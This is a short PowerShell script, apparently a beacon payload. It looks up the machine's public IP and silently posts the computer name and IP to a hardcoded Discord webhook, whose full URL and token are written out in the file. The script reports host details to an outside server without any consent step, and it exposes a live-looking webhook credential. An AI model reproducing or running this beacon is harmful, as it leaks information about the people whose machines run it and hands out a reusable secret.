param (
  [string]$var1
)

$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"

Write-Output "Hello, $Env:ComputerName!"
$IP = Invoke-WebRequest("ifconfig.me")
Write-Output "IP: $IP"
Write-Output "Variable: $var1"

$msg = @{
    content = "Script has been run from $Env:ComputerName at IP $IP."
} | ConvertTo-Json

Invoke-WebRequest -Uri $URL -Method Post -Body $msg -ContentType "application/json" | Out-Null
